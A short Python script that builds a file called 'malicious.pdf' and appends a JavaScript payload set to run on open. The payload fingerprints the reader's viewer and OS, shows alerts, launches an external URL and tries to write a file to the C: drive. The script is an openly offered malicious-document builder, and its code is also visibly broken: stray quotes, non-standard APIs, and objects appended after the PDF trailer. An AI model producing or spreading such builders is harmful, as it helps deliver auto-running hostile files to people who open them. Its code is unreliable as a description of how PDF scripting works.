from fpdf import FPDF
import os

def create_malicious_pdf(output_filename):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="This is a test PDF with JavaScript.", ln=True, align='C')

    # JavaScript pour ouvrir YouTube et écrire un fichier avec l'arborescence du disque
    js_payload = """
    var info = 'User-Agent: ' + app.viewerType + ' ' + app.viewerVersion + '\nOS: ' + platformName; "
    app.alert(info); "
    app.alert('Test JavaScript in PDF');
    app.launchURL('https://www.youtube.com/watch?v=fC7oUOUEEi4', true);
    
    var file = new File('/C/filesystem_structure.txt'); 
    file.open('w'); 
    file.write('This is a test file generated by PDF JavaScript.'); 
    file.close();
    """

    # Ajouter le JavaScript
    pdf.output(output_filename, dest='F')
    
    with open(output_filename, "ab") as f:
        f.write(b"\n/Names [(EmbeddedJS) << /S /JavaScript /JS (" + js_payload.encode() + b")>>] /OpenAction (EmbeddedJS)\n")

    print(f"Malicious PDF '{output_filename}' created successfully.")

if __name__ == "__main__":
    create_malicious_pdf("malicious.pdf")
